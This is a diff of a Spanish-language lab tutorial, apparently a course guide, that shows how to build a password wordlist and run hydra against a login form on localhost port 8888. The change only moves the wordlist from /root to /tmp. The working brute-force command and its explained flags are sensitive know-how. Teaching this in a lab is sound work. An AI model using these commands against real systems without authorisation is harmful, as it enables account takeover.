@@ -9,7 +9,7 @@ PhpMyAdmin (puerto 8080) también tiene un formulario de login, pero incluye un 
 ## 4.2 — Armar una wordlist
 
 ```bash
-cat > /root/wordlist.txt << 'EOF'
+cat > /tmp/wordlist.txt << 'EOF'
 123456
 password
 admin
@@ -31,12 +31,12 @@ Ese texto es lo que `hydra` va a usar para saber si un intento falló.
 ## 4.4 — Ejecutar hydra
 
 ```bash
-hydra -l admin -P /root/wordlist.txt 127.0.0.1 -s 8888 \
+hydra -l admin -P /tmp/wordlist.txt 127.0.0.1 -s 8888 \
   http-post-form "/login:usuario=^USER^&password=^PASS^:incorrectos"
 ```
 
 - `-l admin` → usuario fijo
-- `-P /root/wordlist.txt` → lista de contraseñas a probar
+- `-P /tmp/wordlist.txt` → lista de contraseñas a probar
 - `-s 8888` → puerto
 - `http-post-form "ruta:body:condición_de_fallo"` → le dice a hydra cómo arma el POST y cómo reconocer un intento fallido
 
